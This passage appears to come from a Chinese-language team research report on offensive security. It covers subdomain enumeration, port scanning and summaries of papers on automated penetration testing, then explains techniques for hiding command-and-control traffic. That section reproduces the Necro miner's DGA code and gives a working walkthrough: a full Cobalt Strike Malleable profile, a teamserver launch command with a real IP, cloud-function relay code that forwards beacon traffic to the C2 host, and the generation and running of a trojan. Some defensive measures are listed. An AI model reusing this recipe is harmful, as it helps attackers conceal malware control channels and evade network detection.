   - 泛域名的检测机制：这里的检测主要依赖IPS和TTL两种方式
     - IPS：如果是泛域名，那么不存在的域名会解析到固定的一些ip上。
     - TTL：在权威 DNS 中，泛解析记录的 TTL 肯定是相同的，如果子域名记录相同，但 TTL 不同，那这条记录可以说肯定不是泛解析记录。

5. DNS验证模块

   - 调用massdns进行dns验证

6. http验证(run_request)

   - 将收集到的域名和配置文件中设置的端口生成url，使用requests访问url并验证，记录http请求结果

7. 子域爬取模块

   1. find_in_history：从URL跳转历史中查找子域名
   2. find_in_resp：从返回内容种查找子域名
   3. find_js_urls: 从js中查找子域名

8. 子域置换模块

   - 子域替换技术可根据已有的子域生成输出大量可能存在的潜在子域，利用这些潜在子域名进一步获取存活子域名

   - 替换方法：

     ```
     increase_num: test.1.foo.example.com -> test.2.foo.example.com, test.3.foo.example.com, ...
     
     decrease_num: test.4.foo.example.com -> test.3.foo.example.com, test.2.foo.example.com, ...
     
     insert_word: test.1.foo.example.com -> WORD.test.1.foo.example.com,test.WORD.1.foo.example.com,test.1.WORD.foo.example.com,...
     
     add_word: test.1.foo.example.com ->test-WORD.1.foo.example.com #WORD 替换为字典
     
     replace_word: WORD1.1.foo.example.com -> WORD2.1.foo.example.com,WORD3.1.foo.example.com,WORD4.1.foo.example.com,...
     
     ```

9. 丰富结果

   - 增加cidr，asn，org，addr，isp等内容，只是丰富结果，并不会收集新的子域名

10. 子域接管模块(Takeover)

    - 检测是否存在子域名接管漏洞，不收集新的子域名

**插件调用结果展示：**

csv格式存储结果：

![](https://s3.hedgedoc.org/demo/uploads/f314670b-d273-4222-909e-59c794d678a3.png)

存储在SQLite数据库中：

![](https://s3.hedgedoc.org/demo/uploads/8d528668-d449-474c-82b6-64efb2349077.png)

该插件得到的信息和含义：


| 字段      | 含义                                                         |
| --------- | ------------------------------------------------------------ |
| new       | 标记是否是新发现的子域名                                     |
| alive     | 是否存活，不存活的判定情况包含：无法解析IP、网络不可达、400、5XX等 |
| request   | 记录HTTP请求是否成功字段，为空是无法解析IP，为0是网络不可达，为1是成功请求 |
| resolve   | 记录DNS解析是否成功                                          |
| url       | 请求的url链接                                                |
| subdomain | 子域名                                                       |
| level     | 是几级子域名                                                 |
| cname     | cname记录                                                    |
| ip        | 解析到的IP                                                   |
| public    | 是否是公网IP                                                 |
| cdn       | 解析的IP是否CDN                                              |
| port      | 请求的网络端口                                               |
| status    | HTTP响应的状态码                                             |
| reason    | 网络连接情况及详情                                           |
| title     | 网站标题                                                     |
| banner    | 网站指纹信息                                                 |
| historty  | 请求时URL跳转历史                                            |
| response  | 响应体文本内容                                               |
| times     | 在爆破中ip重复出现的次数                                     |
| ttl       | DNS解析返回的TTL值                                           |
| cidr      | ip2location库查询出的CIDR                                    |
| asn       | ip2location库查询出的ASN                                     |
| addr      | ip2region库查询出的物理地址                                  |
| isp       | ip2region库查询出的网络服务提供商                            |
| resolver  | 所使用的DNS解析服务器                                        |
| module    | 发现本子域名所使用的模块                                     |
| source    | 发现本子域名的具体来源                                       |
| elapse    | 当前模块发现用时                                             |
| find      | 当前模块发现的子域个数                                       |

创建数据库收集信息：

![](https://s3.hedgedoc.org/demo/uploads/518695ad-4409-4b18-b142-0411785138d1.png)

调用后数据库中的信息展示：

![](https://s3.hedgedoc.org/demo/uploads/0e4078cf-d236-425f-afff-50e779f8f9ae.png)


##### 3.1.2 端口扫描

这里也对端口扫描和服务识别工具进行了调研。调研了最常用的两种开源工具 Massscan 和 Nmap 。

- **Nmap**

  ​	Nmap是一款由Gorden Lyon开发的安全扫描工具，主要用于发现计算机网络上的主机和服务。为了实现其目标，Nmap将特定测试数据包发送到目标主机，然后分析响应内容来识别主机、端口和所运行的服务类型。其在服务及版本信息识别准确度方面十分出色，但网络扫描速度稍逊色于Masscan。

- **Masscan**

  ​	Masscan是一款开源的网络端口扫描软件，其默认采用TCP SYN方式扫描（TCP半开式扫描），扫描速度十分迅速，最快可以在５分钟内扫遍整个IPv4网络，另一方面其可以根据响应内容识别端口上的服务类型，但识别准确度比Nmap效果差。

**调用第三方组件 Masscan 进行全端口扫描。**

扫描结果如下：

![](https://s3.hedgedoc.org/demo/uploads/f76bc4f6-b000-4dd0-ab56-979fdf20adbc.png)

##### 3.1.3 服务识别工具

**调用第三方组件 nmap 进行端口服务识别**

扫描后存入数据库，扫描结果如下：

![](https://s3.hedgedoc.org/demo/uploads/f2d59070-f38e-4581-9827-508fa7d319d4.png)

### 其他自动化渗透方法研究

#### Automated Penetration Testing Using Deep Reinforcement Learning

**通过深度强化学习网络**

我们提出了自动化渗透测试的方法，它有两个阶段。首先利用Shodan搜索引擎收集相关服务器数据，构建真实的网络拓扑结构，并采用多主机多阶段漏洞分析生成该拓扑的攻击树;传统的搜索算法用于在树中找到所有可能的攻击路径，并根据深度强化学习算法的需要构建矩阵表示。作为第二阶段，我们采用深度 QLearning Network (DQN)方法从可能的候选对象中发现最容易利用的攻击路径。通过生成数千个输入场景对该方法进行评估，DQN能够以0.86的准确率找到最优路径，同时在其他情况下也提供了有效的解决方案。

![](https://s3.hedgedoc.org/demo/uploads/7fa69a2d-16a6-4529-8661-1f84b984f102.png)


- 模型框架

  - 训练数据:构建DQN算法所需的训练数据作为输入

    我们创建训练数据以提供给DQN模型的方法包括三个步骤：

    1. 使用Shodan收集网络信息以建模真实的网络环境；

       ​    使用Shodan来收集真实网络设备的信息。对于每个不同的服务，我们创建一个单独的服务数据集文件，其中包含与运行该服务的特定网络主机有关的所有相关信息。在使用收集到的数据的过程中，我们只保留不可识别的信息，如开放的端口或服务名称，以保护隐私。

       ​    除了主机数据集，我们还创建了一个漏洞数据集文件。对于一组已知漏洞，漏洞数据集包括CVE和微软漏洞识别号，以及CVSS分数的类型、基本分数和可利用分数组成部分。为了包含我们需要的所有相关信息，我们将来自国家漏洞数据库(NVD)和微软(MS)数据库的信息结合起来创建一个新的数据集。

    2. 使用MulV AL创建与该网络环境相对应的攻击树；

       ​    为了生成DQN算法所需的数据集，我们首先需要为一组给定的网络拓扑创建攻击树。MulV AL使用这些详细的网络拓扑信息来生成与该拓扑相对应的攻击树。

    3. 预处理数据以使其适合在DQN模型中使用。

       ​    将攻击树中的所有节点映射到矩阵形式，该矩阵形式包括针对漏洞的CVSS评分信息，以及用于其他操作的一些预定义评分，例如访问文件。下一步，我们决定通过使用深度优先搜索(deep - first Search, DFS)算法来简化它，而不是将这个矩阵直接输入DQN算法。这个想法是，完整的转移矩阵显示了所有可能的移动，但如果我们只选择那些可以用来达到攻击目标的移动，它可以被简化。

       ​    使用DFS算法来找到所有可以到达目标的可能路径，然后我们创建一个简化矩阵，其中包含：(i)第一列中开始节点的分数；(ii)中间列中间步骤的总分；(iii)最后一列的目标节点得分。这些分数将在DQN算法中进一步用作奖励分数。

  - DQN模块:训练DQN算法，然后使用训练好的模型进行渗透测试

    ​    在我们的框架中使用DQN，通过DQN模型的连续训练来确定最可行的攻击路径。模型的输入是上面提到的简化矩阵，激活函数我们使用 `softmax` 函数。DQN模型的输出是最优攻击路径。在学习过程中，DQN模型代理代表攻击者，目标环境由简化的攻击矩阵建模。攻击者可以在攻击矩阵中从一个节点移动到另一个节点，直到到达最终目标——目标服务器。

    ​    利用DQN模型中使用的每个漏洞对应的奖励是由我们基于通用漏洞评分系统(CVSS)的组件定义的漏洞评分计算的:
    $$
    Score_{vul}=baseScore\times \frac{exploitablityScore}{10}
    $$
    在CVSS中，基本得分反映了漏洞本身的危害性，可利用性得分反映了利用该特定漏洞的可行性。因此，我们使用最大值为10的可利用性评分，来考虑使用某个漏洞的可行性，对基本评分的重要性进行加权。

  - 渗透工具:用于在实际系统上执行操作的外部工具的包装器

    ​    为了能够使用我们的自动化渗透测试框架对实际系统进行攻击，它需要能够与实际的网络环境进行交互，例如运行命令、利用漏洞等等。在这个阶段，我们决定使用现有的渗透测试工具，如Metasploit，而不是构建我们自己的工具，类似于CyPROM采取的方法。

    ​    虽然此功能的实现仍在进行中，但我们将在不久的将来将其与框架的其他部分一起发布。我们的方法是为渗透测试工具创建一个包装器，这样按照上面描述训练的DQN模型的结果就可以用来向那些渗透工具发送命令，这些渗透工具将在真正的目标系统上执行操作。这些行动的结果作为反馈接收，并用于决定如何继续进行给定的攻击路径。

  其他同样方法的文章：Deep hierarchical reinforcement agents for automated penetration testing

#### HARMer: Cyber-Attacks Automation and Evaluation

**基于度量的自动化路径选择方案**

  我们提出了一个新的网络攻击生成自动化框架，名为“HARMer”，以解决红队手动攻击执行方面的挑战。我们提出的新框架、设计和实现是基于一个可扩展的图形安全模型，称为分层攻击表示模型(HARM)。(1)提出自动化框架的要求和关键阶段。(2)提出了基于安全指标的攻击规划策略及其算法。(3)我们在真实的企业网络和Amazon Web Services中进行实验。结果显示了框架的不同阶段如何相互作用以模拟攻击者的操作。该框架将允许安全管理员以自动化的方式自动评估各种威胁和攻击的影响。

  (优化分层攻击表示模型(分层攻击表示模型))

- 攻击自动化框架

    ![](https://s3.hedgedoc.org/demo/uploads/4e8765f7-020f-43e7-8aee-496bf423806e.png)


  - 数据收集

    ​    在网络环境中可以收集到很多信息。然而，这个框架只使用构建攻击模型所需的相关信息。该框架将漏洞扫描工具、网络和开放端口发现工具结合在一起，自动收集信息。但是，该框架并不局限于通过扫描和发现工具收集的信息，因为网络管理员也可以提供其他信息。例如，网络管理员可能拥有其网络中发现的设备的网络映射，包括其配置信息。这种映射(它提供了网络拓扑)可以用作此阶段的输入。此外，还可以使用OpenVAS、Nessus、Nmap等安全工具收集主机的漏洞信息、操作系统、服务端口等。

  - 图形安全模型（GSM）构建

    在第二阶段，使用阶段1收集的信息生成网络的双层HARM。在HARM中捕获并列举了所有潜在的攻击路径，从而很好地捕获了可能的攻击场景。对于安全分析，安全决策者可以选择与安全模型一起使用的安全度量。在这里，通过模型计算的安全度量将用于对攻击计划做出决策。因此，这个阶段会根据所选的安全度量,每个攻击路径的风险,损害或成功攻击的概率来评估它们。

  - 攻击计划阶段

    此阶段负责为对手(攻击者)代理计划和生成操作。在这里，计划可能包括来自下一个主机/目标的响应，端口扫描和IP测距，或有针对性的操作，例如利用主机的软件漏洞，发送鱼叉式网络钓鱼电子邮件等。各种方法可以与HARM一起使用，以战略性地生成可能的攻击计划。我们将在第四节中描述这些方法。

    我们选择使用基于度量的攻击计划和HARM以攻击场景的形式为攻击者生成攻击计划。我们可以基于HARM中使用的度量来生成确定性攻击计划。可以用攻击语言制定攻击计划。使用攻击语言的主要原因是允许创建的攻击计划是通用的，并且对于不同类型的攻击和防御工具是有用的。此外，用通用攻击语言编写的攻击计划可以转换为适合此类攻击和防御工具使用的格式。

  - 攻击执行与评估

    在本文中，我们最初选择使用Metasploit作为利用漏洞的攻击工具。在这里，从攻击计划阶段生成的输出作为执行的输入提供给攻击执行和评估阶段。我们当前的实现不支持从安全模型语言到Metasploit兼容输出的转换。相反，我们实现了从基于度量的计划输出到Metasploit兼容格式的直接转换。攻击是针对从初始“信息收集”阶段发现的漏洞执行的。需要强调的是，攻击执行阶段递归地与攻击计划阶段一起工作。

- 攻击计划策略

  - 基于路径的方法

    利用一个或多个基于路径的安全度量来计划完成攻击目标的动作序列，选用最短路径度量，即：攻击者到攻击目标的最小距离（最小主机序列）
    $$
    SP=min|AP|
    $$
    使用HARM对网络安全态势进行建模，用基于CVSS的基础评分指标来计算与主机漏洞相关的攻击路径和风险

    根据风险对攻击路径应用优先级排序首先选择最关键的攻击路径。根据CVSSBS计算每个路径的影响:
    $$
    Risk_{ap}=\sum_{h\in ap}p_h\times aim_h,ap\in AP
    $$

  - 复合度量法

    攻击者的行为涉及多个变量，单个安全度量无法捕获全部信息，故需要使用复合指标将单个指标组合起来成一个新的指标。

    将多阶段攻击(即攻击路径)的属性与攻击成功概率度量相结合，形成称为路径上攻击成功概率的度量。该度量通过攻击路径评估攻击成功的可能性。
    $$
    p_{ap}=\prod_{h\in ap}p_h,ap\in AP\\
    P=max_{ap\in AP}p_{ap}
    $$

  - 原子度量法

    假设攻击者具有增量学习能力，攻击目标为特定的目标机器，提出基于原子度量的规划策略。根据攻击需要付出的代价和利用漏洞的难度来考虑攻击的成本，我们使用攻击成本度量(从攻击者的角度)来确定攻击者对要利用的主机的选择。通常，攻击者可能会选择攻击力度较低的主机，对目标机器进行多阶段攻击。

    当攻击者对网络只有部分了解时，我们使用这个思想来制定攻击计划策略。攻击者根据相邻主机的可达性和攻击成本值进行攻击，从初始主机逐渐移动到直到达到攻击目标。算法使用以下上下文来解释这种攻击计划方法。攻击者只能访问(并且知道)对公众开放的设备(例如，web服务器)。攻击者将能够利用现有漏洞获得对公众开放的设备的根控制。发生这种情况的原因可能是由于软件依赖关系或修补时间而无法修补漏洞。攻击者可能能够发现位于内部网络的web服务器(例如，应用服务器)可访问的主机。然后，攻击者可以扫描主机的漏洞，然后利用最容易的漏洞(低攻击努力)，然后移动到下一个主机。

    在这种情况下，防火墙可能无法阻止连接，因为攻击者使用的是合法的用户帐户和权限。目标只接受来自内部网络主机的连接，因此攻击者可以到达目标，然后使用现有漏洞将目标的权限升级为管理权限

![](https://s3.hedgedoc.org/demo/uploads/32f07f4d-75fd-4d13-9fe1-20efab4a29c1.png)


## 5、高隐蔽性回传技术（动态域名、动态路径、匿名网络）（梁超越）

### C2服务器隐藏和流量隐匿

（1）Cobalt Strike Server 分布概况 

根据收集到的 Cobalt Strike 的 C&C 服务器数据以及对这些服务器的地理位置分布进行统计分析，可以推断该工具在全球的分布情况以及大致流行程度。从结果来看，Cobalt Strike服务器的分布范围非常广泛，包括 36 个国家和地区。对这批命令控制服务器（C&C）的所属运营商进行划分。结果表明，大量服务器归属于规模较小或无法识别的运营商。此类厂商的安全管理工作通常较为松散、混乱，相应的租金也较为低廉，攻击者往往倾向于选择此类厂商架设服务器以降低攻击成本和躲避监管。 



（2）CobaltStrike 流量隐匿技术 

随着网络安全审查机制的日趋成熟和完善，隐匿技术受到越来越多的关注，各种 C2 服务器隐藏技术和通讯流量隐匿技术层出不穷。攻击者用于对抗流量监管和运维分析，防守人员则用于检验自身审查机制或赋能产品。 在对这些在野的 Cobalt Strike 样本的回连 C&C 数据进行整理分析时，我们发现大量使用流量伪装技术、云函数/服务、CDN 技术、域名前置技术进行流量隐藏的样本，回连 C&C服务器涉及的域名中也出现大量特殊的域名，例如 CDN 域名、仿冒合法网站的域名、甚至是携带合法 SSL 证书的白域名等等。在进一步分析后发现，攻击者为对抗监管审查和流量分析，会将多种 C2 隐藏技术和通讯隐匿技术协同运用。 

![image-20230423220809880](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230423220809880.png)

攻击者往往会将 C2 隐藏技术与通讯隐匿技术结合使用来进一步增强自身的隐蔽性，例如：CDN+域名伪造、域前置+配置 Profiles 等等。



#### （1）CDN

Content Delivery Network（CDN）是一个由地理位置分布不同的服务器组成的系统，它们协同工作为用户提供快速的 Internet 内容访问，通过减少服务器和用户之间的物理距离来最大程度减少加载网页的延迟。CDN 在收到对尚未缓存的资源的请求时，会将请求转发到源服务器。攻击者利用该特性，将 C&C 服务器部署在 CDN 之后，由 CDN 中转 C&C 通信流量，借助CDN接入服务将流量中转至真实的C2服务器，从而隐藏真实 C&C 地址，加大溯源难度。C&C 中常见的云服务提供商包括亚马逊（cloudfront.net）、Cloudflare（cdn.cloudflare.net）、阿里云（alikunlun.com）、腾讯云（cdn.dnsv1.com）等。 

![title](https://leanote.com/api/file/getImage?fileId=5e258af4ab64411ab6007467)

原理：让cdn转发合法的http或者https流量来达到隐藏的目的。

流程：

1. 配置一个cdn
2. 获取一个公网域名
3. 配置cdn的A记录解析使其能解析到C2服务器的ip
4. 将公网域名填写到CS listener的host处并填写可用的端口



可达到的效果：

受害主机上只会有跟cdn的ip通信的流量，不会有跟真实C2通信的流量，可以保护C2的ip，但是域名还是会暴露。

技术实现重点：

1. 一个不备案的域名，否则可以溯源到ip
2. 这种技术对http与https没有强制要求，都可以使用，而域前置技术要求是https



##### 防护手段：

- 使用网络签名来识别特定对手恶意软件的流量
- 分析网络数据中不常见的数据流，如客户端发送的数据明显多于从外部服务器接收的数据
- 数据包检测不符合端口预定协议行为的通信
- 确认自己资产中是否CDN的正常业务，若无则进行拦截
- 通过溯源手段尝试对IP进行溯源。



#### （2）域前置

域前置（Domain Fronting）是一种隐藏通信端点的通用审查规避技术，其关键思想是在

不同通信层使用不同的域名。在 HTTPS 请求中，目标站点的域名通常会出现在三个位置：

DNS 查询请求中、TLS 服务器名称指示（SNI）扩展以及 HTTP 请求 Host 中。通常情况下，

三个位置的域名应该相同。然而，在域前置的 HTTPS 请求中，DNS 查询和 SNI 携带一个域

名（合法的“前端域”），而被 TLS 加密对审查人员隐藏的 HTTP 请求中 Host 却携带另一个域

名（隐藏的“内部域”）。HTTP.Host 对审查监管人员不可见，但对接收 HTTPS 请求的前端服

务器可见，前端服务器解析出“内部域”后将请求转发至隐蔽域名。 

![image-20230424162811086](C:\Users\chaoyue\AppData\Roaming\Typora\typora-user-images\image-20230424162811086.png)



​	域前置多与 CDN 配合使用，客户端发出的请求看起来是发往合法站点，该站点解析到

CDN 服务器，之后 CDN 服务器对请求进行解密，读取 HTTP.Host 并将请求转发至其指定的

隐蔽域名。分析中发现，出现了一种简化配置的情况：“无域”前置，即没有 DNS 请求且 SNI

为空，而是直接使用 IP 地址将请求发送至 CDN 服务器，再由其解析并转发请求，达到隐藏

真实 C&C 地址的目的。 



可达到的效果：通过一个高信任域名隐藏自己的真实域名与ip，且受害主机上的流量只有跟cdn通信的，不会有跟真实c2的通信流量。

技术实现重点：

1. 需要基于https
2. 需要知道cdn上的其他高信誉域名或者ip
3. 需要修改malleable profile文件



### （3）云函数

​	云函数（FaaS）是一段运行在云端的、轻量的、无关联的、并且可重用的代码。用户无

需管理服务器，只需编写和上传代码，即可获得对应的数据结果。攻击者编写请求接收转发

代码，将流量中转至 C2 服务器，之后发布成云函数服务。当 C2 通讯流量请求云函数时，

触发运行转发代码，所有流量经由云函数转发至隐藏的真实 C&C 地址。 

​	在分析过程中，可以发现大量使用 Heroku 以及腾讯云平台进行流量转发的类似样本。

Heroku 是一个支持多种编程语言的云平台即服务，为用户免费提供 docker 容器部署，以及

开放 Web 服务至互联网。

![img](https://img2022.cnblogs.com/blog/2601339/202204/2601339-20220428095944722-1247101024.png)

​	云函数作为一种Serverless的服务，会有一个API网关触发器配合进行使用，该网关提供了一个**厂商备案过**的特定域名，具备高可信度的同时又具备IP不唯一的特点。



云函数隐藏C2流程：

![img](https://img2022.cnblogs.com/blog/2601339/202204/2601339-20220428095952832-1794042256.png)

##### **防护手段**

- 使用网络签名来识别特定对手恶意软件的流量
- 分析网络数据中不常见的数据流，如客户端发送的数据明显多于从外部服务器接收的数据
- 数据包检测不符合端口预定协议行为的通信
- 确认自己资产中是否云函数的正常业务，若无则进行拦截





### （4）配置Profile

Cobalt Strike 的有效载荷称为 Beacon，使用 HTTP、HTTPS 或 DNS 与其服务器

（TeamServer）进行通信，支持通过 Malleable-C2-Profiles 配置文件来进行高度化的配置，

为其整体提供相当大的灵活性和扩展性。 

​	攻击者能够通过加载 Malleable C2 配置文件来修改有效载荷（Beacon）与服务器

（TeamServer）之间的流量特征，将通信流量伪装成其它正常应用网站的访问流量，以此隐

藏通信流量，规避流量安全审查和检测。由于技术门槛和成本极低，且隐匿效果良好，该技

术已成为攻击者使用最多的 C&C 通信隐匿技术。在捕获的 C&C 数据中，近 30%的攻击者会

使用自定义的 Malleable C2 配置文件来对抗流量检测。 

​	攻击者自定义的 Malleable C2 配置文件会将通讯流量伪装成高可信度应用网站的正常

Web 请求。常见伪装的目标有 Jquery、Windowsupdate、Amazon 等，示例如下：

![](https://s3.hedgedoc.org/demo/uploads/b5a5343d-1f41-4229-8829-b4955cbe1378.png)



### （5）域名仿造

​	通过仿冒与合法域名的相似域名干扰普通用户或运维分析人员。该类技术门槛较低，攻

击者通常使用替换相似字符、拼接迷惑性词语、字母调换位置、更换顶级域名等方式仿造正

常合法域名，而普通用户或运维人员在惯性思维下很难分辨真伪。被仿照的域名知名度越高，

越不容易引起用户或运维人员的怀疑，如 Google、Microsoft、Windows、Office 等都是常常

被选择的伪造目标。由于此类伪装方式具有很强的迷惑性和隐蔽性，且技术门槛和成本较低，

会对普通用户或日志分析人员产生较大干扰，俨然成为许多攻击组织的标准配置。 

![](https://s3.hedgedoc.org/demo/uploads/201ce5f2-fa3c-4f3d-9e96-21b271351507.png)


![](https://s3.hedgedoc.org/demo/uploads/36cac0d6-9392-465c-9a83-92c5f85769e9.png)




### （6）子域名DGA+动态域名

​	DGA（Domain Generation Algorithm，域名生成算法）是一种利用随机字符来生成 C&C（Command and Control，命令与控制）域名，从而逃避域名黑名单检测 的技术手段。

​	攻击者利用DGA产生恶意域名后，选择部分域名进行注册并指向C&C服务器。当受害者运行恶意程序后，主机将通过恶意域名连接至C&C服务器，攻击者即可远程操控主机。在红队攻击和渗透测试中，好的DGA域名是攻击准备的一部分。



​	Necro挖矿病毒采用DGA生成子域名，然后配合动态域名生成最终的C2域名。从代码里我们可以看到候选的动态域名多达30个。

```python
zMuBHdcdB=0
while zMuBHdcdB < 0xcc:
    zMuBHdcdB+=1
    random.seed(a=0x7774DEAD + zMuBHdcdB)
    RaRdhjkniVY=(''.join(random.choice('abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randrange(10,19)))).lower()
    RaRdhjkniVY+="."+random.choice(['ddns.net','ddnsking.com','3utilities.com','bounceme.net','freedynamicdns.net','freedynamicdns.org','gotdns.ch','hopto.org','myddns.me','myftp.biz','myftp.org','myvnc.com','onthewifi.com','redirectme.net','servebeer.com','serveblog.net','servecounterstrike.com','serveftp.com','servegame.com','servehalflife.com','servehttp.com','serveirc.com','serveminecraft.net','servemp3.com','servepics.com','servequake.com','sytes.net','viewdns.net','webhop.me','zapto.org'])
    print RaRdhjkniVY

```





### 云函数+配置 Profiles隐藏C2



在vultr上配置VPS，选择美国纽约节点

![](https://s3.hedgedoc.org/demo/uploads/4c574776-6b76-4666-970b-aa063f178bd0.png)

![](https://s3.hedgedoc.org/demo/uploads/25869a82-5511-4776-b1ae-a57d0a88229e.png)


![](https://s3.hedgedoc.org/demo/uploads/e0518ebb-39d8-4ab8-bfdd-5816fcd66638.png)




配置CS的profile文件（c2.profile）：

```
set sample_name "func";
set sleeptime "3000";
set jitter    "0";
set maxdns    "255";
set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";

http-get {

    set uri "/api/x";

    client {
        header "Accept" "*/*";
        metadata {
            base64;
            prepend "SESSIONID=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Server" "Nodejs";
        output {
            base64;
            print;
        }
    }
}
http-stager {
    set uri_x86 "/vue.min.js";
    set uri_x64 "/bootstrap-2.min.js";
}
http-post {
    set uri "/api/y";
    client {
        header "Accept" "*/*";
        id {
            base64;
            prepend "JSESSION=";
            header "Cookie";
        }
        output {
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Connection" "keep-alive";
        output {
            base64;
            print;
        }
    }
}
```

在VPS中启动C2服务器：

```bash
./teamserver 207.148.23.23 123456 c2.profile
```

![](https://s3.hedgedoc.org/demo/uploads/bd04ecfb-acd0-4235-8483-43a3cfc4e112.png)




在腾讯云中新建一个云函数

![](https://s3.hedgedoc.org/demo/uploads/cee26ba1-073c-43ec-98c1-535780d7ca28.png)

选择事件函数，运行环境为Python3.6

![](https://s3.hedgedoc.org/demo/uploads/9cda63f0-315a-46b6-8322-dc1b17343e04.png)


编写云函数代码：

```py
# -*- coding: utf8 -*-
import json,requests,base64
def main_handler(event, context):
    response = {}
    path = None
    headers = None
    try:
        # C2服务器地址
        C2='http://207.148.23.23:80'
        if 'path' in event.keys():
            path=event['path']
        if 'headers' in event.keys():
            headers=event['headers']
        if 'httpMethod' in event.keys() and event['httpMethod'] == 'GET' :
            resp=requests.get(C2+path,headers=headers,verify=False) 
        else:
            resp=requests.post(C2+path,data=event['body'],headers=headers,verify=False)
            print(resp.headers)
            print(resp.content)
        response={
            "isBase64Encoded": True,
            "statusCode": resp.status_code,
            "headers": dict(resp.headers),
            "body": str(base64.b64encode(resp.content))[2:-1]
        }
    except Exception as e:
        print('error')
        print(e)
    finally:
        return response
```

![](https://s3.hedgedoc.org/demo/uploads/fd04e651-430e-4e34-8463-d99b921759fb.png)


创建一个触发器

![](https://s3.hedgedoc.org/demo/uploads/927ec1e3-440d-46f8-9933-1544e5dd4cd3.png)

前端配置修改路径为/

![](https://s3.hedgedoc.org/demo/uploads/d89f25f3-b9d7-43c4-b9e5-8b71e7683a14.png)


![](https://s3.hedgedoc.org/demo/uploads/713d965e-32cc-48d8-8cc8-c58ad08716ac.png)


配置完成后发布服务

![](https://s3.hedgedoc.org/demo/uploads/52c34608-deae-49f3-8164-9ba36192a7b9.png)


找到云函数api的默认访问地址

![](https://s3.hedgedoc.org/demo/uploads/5c5e7b80-3cab-4baa-8725-b939e286e076.png)


CS连接到C2服务器之后启动监听，HTTP地址设置为默认访问地址：

![](https://s3.hedgedoc.org/demo/uploads/a9304fae-6cf6-4071-b9ea-7216493fc85e.png)


使用刚才配置好的监听器生成木马

![](https://s3.hedgedoc.org/demo/uploads/bd8ac99c-5339-4634-937d-059c810ea00c.png)

在靶机中执行木马程序，使靶机上线。

![](https://s3.hedgedoc.org/demo/uploads/2cc93d1d-4d26-495f-ab14-87dc5411e790.png)


放入微步云沙箱检测，有新的主机上线，但是IP是在动态变化的，而且均为腾讯云的服务器地址，成功进行了隐蔽回传：

![](https://s3.hedgedoc.org/demo/uploads/61fda5b5-3ac9-40e9-87e5-8058747ce019.png)



## 网络基础设施设备的远程攻击和控制（路由器、防火墙、IoT设备、智能终端的攻击和控制）
